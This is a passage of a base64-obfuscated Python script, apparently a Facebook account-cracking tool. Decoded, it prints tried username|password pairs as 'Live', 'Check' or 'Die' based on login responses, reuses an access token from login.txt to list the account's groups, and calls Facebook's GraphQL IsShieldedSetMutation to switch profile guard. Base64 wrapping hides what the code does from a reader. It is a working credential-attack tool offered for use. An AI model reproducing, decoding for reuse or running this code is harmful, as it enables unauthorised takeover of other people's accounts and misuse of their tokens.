vbi5sb2FkcyhkYXRhLnRleHQpCgkJaWYgJ2FjY2Vzc190b2tlbicgaW4gbXBzaDoKCQkJbGl2ZS5hcHBlbmQocGFzc3dvcmQpCgkJCXByaW50IlwwMzNbMTs5N21bIFwwMzNbMTs5Mm1MaXZlXDAzM1sxOzk3bSBdIFwwMzNbMTs5N20iK3VzZXJuYW1lKyJ8IitwYXNzd29yZAoJCWVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIG1wc2hbImVycm9yX21zZyJdOgoJCQljaGVja19pdC5hcHBlbmQocGFzc3dvcmQpCgkJCXByaW50IlwwMzNbMTs5N21bIFwwMzNbMTs5M21DaGVja1wwMzNbMTs5N20gXSBcMDMzWzE7OTdtIit1c2VybmFtZSsifCIrcGFzc3dvcmQKCQllbHNlOgoJCQlkaWUuYXBwZW5kKHBhc3N3b3JkKQoJCQlwcmludCJcMDMzWzE7OTdtWyBcMDMzWzE7OTFtRGllXDAzM1sxOzk3bSBdIFwwMzNbMTs5N20iK3VzZXJuYW1lKyJ8IitwYXNzd29yZAoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCglwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbFwwMzNbMTs5MW0gOiBcMDMzWzE7OTdtTGl2ZT1cMDMzWzE7OTJtIitzdHIobGVuKGxpdmUpKSsiIFwwMzNbMTs5N21DaGVjaz1cMDMzWzE7OTNtIitzdHIobGVuKGNoZWNrX2l0KSkrIiBcMDMzWzE7OTdtRGllPVwwMzNbMTs5MW0iK3N0cihsZW4oZGllKSkKCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCglmdW5jKCkKCiMjIyMjIGdyb3VwIFNBWUEgIyMjIyMKZGVmIGdyb3VwX2xpc3QoKToKCW9zLnN5c3RlbSgnY2xlYXInKQoJdHJ5OgoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgwLjAxKQoJCWxvZ2luKCkKCXRyeToKCQlvcy5ta2Rpcignb3V0JykKCWV4Y2VwdCBPU0Vycm9yOgoJCXBhc3MKCW9zLnN5c3RlbSgnY2xlYXInKQoJcHJpbnQgbG9nbwoJdHJ5OgoJCXVoID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9ncm91cHM/YWNjZXNzX3Rva2VuPScrZmJfdG9rZW4pCgkJZ29vZCA9IGpzb24ubG9hZHModWgudGV4dCkKCQlmb3IgcCBpbiBnb29kWydkYXRhJ106CgkJCWZiX25hbWUgPSBwWyJuYW1lIl0KCQkJaWQgPSBwWyJpZCJdCgkJCWY9b3Blbignb3V0L2dyb3VwaWQudHh0JywndycpCgkJCWxpc3Rncm91cC5hcHBlbmQoaWQpCgkJCWYud3JpdGUoaWQgKyAnXG4nKQoJCQlwcmludCAiXDAzM1sxOzk3bVsgXDAzM1sxOzkybU15R3JvdXBcMDMzWzE7OTdtIF0gIitzdHIoaWQpKyIgPT4gIitzdHIoZmJfbmFtZSkKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBHcm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJXMiJShsZW4obGlzdGdyb3VwKSkKCQlwcmludCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU2F2ZWQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bW91dC9ncm91cGlkLnR4dCIpCgkJZi5jbG9zZSgpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlmdW5jKCkKCWV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOgoJCXByaW50KCJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZnVuYygpCglleGNlcHQgS2V5RXJyb3I6CgkJb3MucmVtb3ZlKCdvdXQvZ3JvdXBpZC50eHQnKQoJCXByaW50KCdcMDMzWzE7OTFtWyFdIEdyb3VwIG5vdCBmb3VuZCcpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlmdW5jKCkKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gQ29ubmVjdGlvbiIKCQlleGl0KCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIEVycm9yIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZnVuYygpCgojIyMjIyBQUk9GSUxFIEdVQVJEICMjIyMjCmRlZiBndWFyZCgpOgoJZ2xvYmFsIGZiX3Rva2VuCglvcy5zeXN0ZW0oJ2NsZWFyJykKCXRyeToKCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMC4wMSkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ2NsZWFyJykKCXByaW50IGxvZ28KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS5cMDMzWzE7OTdtIEFjdGl2YXRlIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0yLlwwMzNbMTs5N20gTm90IGFjdGl2YXRlIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5N20gQmFjayIKCXByaW50ICLilZEiCglnID0gcmF3X2lucHV0KCJcMDMzWzE7OTdt4pWa4pWQXDAzM1sxOzkxbUQgXDAzM1sxOzk3bSIpCglpZiBnID09ICIxIjoKCQlhY3RpdmF0ZWQgPSAidHJ1ZSIKCQlqYXkoZmJfdG9rZW4sIGFjdGl2YXRlZCkKCWVsaWYgZyA9PSAiMiI6CgkJbm90X2FjdGl2ZSA9ICJmYWxzZSIKCQlqYXkoZmJfdG9rZW4sIG5vdF9hY3RpdmUpCgllbGlmIGcgPT0iMCI6CgkJZnVuYygpCgllbGlmIGcgPT0iIjoKCQlleGl0KCkKCWVsc2U6CgkJZXhpdCgpCgpkZWYgZ2V0X3VzZXJpZChmYl90b2tlbik6Cgl1cmwgPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/YWNjZXNzX3Rva2VuPSVzIiVmYl90b2tlbgoJcmVzID0gcmVxdWVzdHMuZ2V0KHVybCkKCXVpZCA9IGpzb24ubG9hZHMocmVzLnRleHQpCglyZXR1cm4gdWlkWyJpZCJdCgpkZWYgamF5KGZiX3Rva2VuLCBlbmFibGUgPSBUcnVlKToKCWlkID0gZ2V0X3VzZXJpZChmYl90b2tlbikKCWRhdGEgPSAndmFyaWFibGVzPXsiMCI6eyJpc19zaGllbGRlZCI6ICVzLCJzZXNzaW9uX2lkIjoiOWI3ODE5MWMtODRmZC00YWI2LWIwYWEtMTliMzlmMDRhNmJjIiwiYWN0b3JfaWQiOiIlcyIsImNsaWVudF9tdXRhdGlvbl9pZCI6ImIwMzE2ZGQ2LTNmZDYtNGJlYi1hZWQ0LWJiMjljNWRjNjRiMCJ9fSZtZXRob2Q9cG9zdCZkb2NfaWQ9MTQ3NzA0MzI5MjM2NzE4MyZxdWVyeV9uYW1lPUlzU2hpZWxkZWRTZXRNdXRhdGlvbiZzdHJpcF9kZWZhdWx0cz10cnVlJnN0cmlwX251bGxzPXRydWUmbG9jYWxlPWVuX1VTJmNsaWVudF9jb3VudHJ5X2NvZGU9VVMmZmJfYXBpX3JlcV9mcmllbmRseV9uYW1lPUlzU2hpZWxkZWRTZXRNdXRhdGlvbiZmYl9hcGlfY2FsbGVyX2NsYXNzPUlzU2hpZWxkZWRTZXRNdXRhdGlvbicgJSAoZW5hYmxlLCBzdHIoaWQpKQoJaGVhZGVycyA9IHsiQ29udGVudC1UeXBlIiA6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLCAiQXV0aG9yaXphdGlvbiIgOiAiT0F1dGggJXMiICUgZmJfdG9rZW59Cgl1cmwgPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JhcGhxbCIKCXJlcyA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhID0gZGF0YSwgaGVhZGVycyA9IGhlYWRlcnMpCglwcmludChyZXMudGV4dCkKCWlmICciaXNfc2hpZWxkZWQiOnRydWUnIGluIHJlcy50ZXh0OgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28KCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtQWN0aXZhdGUiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlmdW5jKCkKCWVsaWYgJyJpc19zaGllbGRlZCI6ZmFsc2UnIGluIHJlcy50ZXh0OgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28KCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTFtTm90IGFjdGl2YXRlIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZnVuYygpCgllbHNlOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIEVycm9yIgoJCWV4aXQoKQoKaWYgX19uYW1lX189PSdfX21haW5fXyc6CiAgICAgICAgdG9vbF9tYWluX2Z1bmN0aW9uKCkK'))
